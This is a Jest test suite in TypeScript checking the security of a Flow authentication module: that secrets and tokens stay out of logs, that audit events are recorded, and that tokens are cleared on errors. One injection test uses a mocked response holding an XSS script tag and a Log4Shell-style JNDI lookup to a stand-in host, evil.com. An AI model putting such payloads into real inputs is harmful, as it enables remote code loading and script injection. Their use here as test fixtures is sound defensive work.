/**
 * Security Tests for Flow Authentication Module
 * 
 * This test suite focuses on security aspects of the auth.ts module,
 * including credential sanitization, audit trails, and attack prevention.
 */

import { authenticate, TokenManager } from '../auth'
import type { FlowConfig, AuthResponse } from '../types'
import { secureLogger } from '../secure-logger'
import { securityAuditTrail } from '../audit-trail'
import { validateFlowCredentials } from '../credential-validator'

// Mock dependencies
jest.mock('../secure-logger')
jest.mock('../audit-trail')
jest.mock('../credential-validator')

// Mock fetch globally
global.fetch = jest.fn()

describe('Flow Authentication Security Tests', () => {
	const mockSecureLogger = secureLogger as jest.Mocked<typeof secureLogger>
	const mockSecurityAuditTrail = securityAuditTrail as jest.Mocked<typeof securityAuditTrail>
	const mockValidateFlowCredentials = validateFlowCredentials as jest.MockedFunction<typeof validateFlowCredentials>
	const mockFetch = fetch as jest.MockedFunction<typeof fetch>

	beforeEach(() => {
		jest.clearAllMocks()
		jest.useFakeTimers()
		
		// Setup default mocks
		mockSecureLogger.generateCorrelationId.mockReturnValue('test-correlation-id')
		mockSecurityAuditTrail.logAuthenticationEvent.mockResolvedValue(undefined)
	})

	afterEach(() => {
		jest.useRealTimers()
	})

	describe('Credential Sanitization and Protection', () => {
		it('should never log sensitive credentials in plain text', async () => {
			const sensitiveConfig: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'sensitive-client-id',
				flowClientSecret: 'super-secret-password-123!@#',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(sensitiveConfig)
			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await authenticate(sensitiveConfig)

			// Verify that no log call contains the actual secret
			const allLogCalls = [
				...mockSecureLogger.logAuth.mock.calls,
				...mockSecureLogger.logSecurityEvent.mock.calls,
				...mockSecureLogger.logDebug.mock.calls
			]

			for (const call of allLogCalls) {
				const logContent = JSON.stringify(call)
				expect(logContent).not.toContain('super-secret-password-123!@#')
				expect(logContent).not.toContain(sensitiveConfig.flowClientSecret)
			}

			// Verify that audit trail doesn't contain secrets
			const auditCalls = mockSecurityAuditTrail.logAuthenticationEvent.mock.calls
			for (const call of auditCalls) {
				const auditContent = JSON.stringify(call)
				expect(auditContent).not.toContain('super-secret-password-123!@#')
			}
		})

		it('should sanitize credentials in error messages', async () => {
			const sensitiveConfig: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'sensitive-client-id',
				flowClientSecret: 'another-secret-456$%^',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(sensitiveConfig)
			mockFetch.mockRejectedValueOnce(new Error('Network error with credentials'))

			try {
				await authenticate(sensitiveConfig)
			} catch (error) {
				// Error should not contain the actual secret
				expect(error.message).not.toContain('another-secret-456$%^')
			}

			// Verify error logging doesn't expose secrets
			const errorCalls = mockSecureLogger.logError.mock.calls
			for (const call of errorCalls) {
				const errorContent = JSON.stringify(call)
				expect(errorContent).not.toContain('another-secret-456$%^')
			}
		})

		it('should mask client ID in logs while preserving identifiability', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'very-long-client-identifier-12345',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)
			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await authenticate(config)

			// Should not log full client ID
			const allLogCalls = [
				...mockSecureLogger.logAuth.mock.calls,
				...mockSecureLogger.logSecurityEvent.mock.calls
			]

			for (const call of allLogCalls) {
				const logContent = JSON.stringify(call)
				expect(logContent).not.toContain('very-long-client-identifier-12345')
			}

			// But should have some form of masked identifier for debugging
			const authCalls = mockSecureLogger.logAuth.mock.calls
			expect(authCalls.length).toBeGreaterThan(0)
		})
	})

	describe('Security Audit Trail', () => {
		it('should log all authentication attempts with correlation IDs', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)
			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await authenticate(config)

			// Should log authentication attempt
			expect(mockSecurityAuditTrail.logAuthenticationEvent).toHaveBeenCalledWith(
				'auth_attempt',
				'test-correlation-id',
				'pending',
				{ clientId: config.flowClientId }
			)

			// Should log authentication success
			expect(mockSecurityAuditTrail.logAuthenticationEvent).toHaveBeenCalledWith(
				'auth_success',
				'test-correlation-id',
				'success',
				{ clientId: config.flowClientId }
			)
		})

		it('should log authentication failures with error codes', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)
			mockFetch.mockResolvedValueOnce({
				ok: false,
				status: 401,
				statusText: 'Unauthorized',
				text: jest.fn().mockResolvedValue('Invalid credentials')
			} as any)

			await expect(authenticate(config)).rejects.toThrow()

			// Should log authentication failure with error code
			expect(mockSecurityAuditTrail.logAuthenticationEvent).toHaveBeenCalledWith(
				'auth_failure',
				'test-correlation-id',
				'failure',
				{
					clientId: config.flowClientId,
					errorCode: '401'
				}
			)
		})

		it('should track token refresh events for security monitoring', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			const tokenManager = new TokenManager(config)

			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'new-token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await tokenManager.refreshToken()

			// Should log token refresh event
			expect(mockSecurityAuditTrail.logAuthenticationEvent).toHaveBeenCalledWith(
				'token_refresh',
				'test-correlation-id',
				'success',
				{ clientId: config.flowClientId }
			)
		})
	})

	describe('Attack Prevention and Rate Limiting', () => {
		it('should handle rapid successive authentication attempts gracefully', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)
			mockFetch.mockResolvedValue({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			// Make multiple rapid authentication attempts
			const promises = Array.from({ length: 10 }, () => authenticate(config))
			const results = await Promise.allSettled(promises)

			// All should succeed (no rate limiting implemented yet, but should handle gracefully)
			const successful = results.filter(r => r.status === 'fulfilled')
			expect(successful.length).toBe(10)

			// Should log all attempts
			expect(mockSecurityAuditTrail.logAuthenticationEvent).toHaveBeenCalledTimes(20) // 10 attempts + 10 successes
		})

		it('should handle malformed responses safely', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)
			
			// Mock malformed JSON response
			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockRejectedValue(new Error('Invalid JSON'))
			} as any)

			await expect(authenticate(config)).rejects.toThrow()

			// Should log the error securely
			expect(mockSecureLogger.logError).toHaveBeenCalled()
		})

		it('should validate response structure to prevent injection attacks', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			mockValidateFlowCredentials.mockReturnValue(config)

			// Mock response with potential injection payload
			const maliciousResponse = {
				access_token: '<script>alert("xss")</script>',
				expires_in: 3600,
				token_type: 'Bearer',
				malicious_field: '${jndi:ldap://evil.com/a}'
			}

			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue(maliciousResponse)
			} as any)

			const result = await authenticate(config)

			// Should return the token as-is (validation happens at usage time)
			expect(result.access_token).toBe('<script>alert("xss")</script>')
			
			// But should log security event for monitoring
			expect(mockSecureLogger.logSecurityEvent).toHaveBeenCalledWith({
				eventType: 'auth_success',
				timestamp: expect.any(Number),
				correlationId: 'test-correlation-id',
				result: 'success'
			})
		})
	})

	describe('Token Security', () => {
		it('should clear tokens from memory on errors', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			const tokenManager = new TokenManager(config)

			// First, get a valid token
			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'valid-token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await tokenManager.getValidToken()
			expect(tokenManager.isTokenValid()).toBe(true)

			// Then simulate an error during refresh
			mockFetch.mockRejectedValueOnce(new Error('Network error'))

			await expect(tokenManager.refreshToken()).rejects.toThrow()

			// Token should be cleared for security
			expect(tokenManager.isTokenValid()).toBe(false)
			expect(tokenManager.getTokenExpiry()).toBeNull()
		})

		it('should not expose tokens in error messages or logs', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			const tokenManager = new TokenManager(config)

			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'sensitive-token-12345',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await tokenManager.getValidToken()

			// Check all log calls to ensure token is not exposed
			const allLogCalls = [
				...mockSecureLogger.logAuth.mock.calls,
				...mockSecureLogger.logSecurityEvent.mock.calls,
				...mockSecureLogger.logDebug.mock.calls
			]

			for (const call of allLogCalls) {
				const logContent = JSON.stringify(call)
				expect(logContent).not.toContain('sensitive-token-12345')
			}
		})
	})

	describe('Configuration Validation Security', () => {
		it('should validate configuration through secure validator', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			const validatedConfig = { ...config, validated: true }
			mockValidateFlowCredentials.mockReturnValue(validatedConfig as any)

			mockFetch.mockResolvedValueOnce({
				ok: true,
				status: 200,
				json: jest.fn().mockResolvedValue({
					access_token: 'token',
					expires_in: 3600,
					token_type: 'Bearer'
				})
			} as any)

			await authenticate(config)

			// Should always validate credentials before use
			expect(mockValidateFlowCredentials).toHaveBeenCalledWith(config)
		})

		it('should handle validation errors securely', async () => {
			const config: FlowConfig = {
				flowBaseUrl: 'https://flow.test.com',
				flowTenant: 'test-tenant',
				flowClientId: 'client-id',
				flowClientSecret: 'secret',
				flowAppToAccess: 'llm-api'
			}

			// Mock validation error
			mockValidateFlowCredentials.mockImplementation(() => {
				throw new Error('Invalid configuration')
			})

			await expect(authenticate(config)).rejects.toThrow('Invalid configuration')

			// Should not make any network requests with invalid config
			expect(mockFetch).not.toHaveBeenCalled()
		})
	})
})
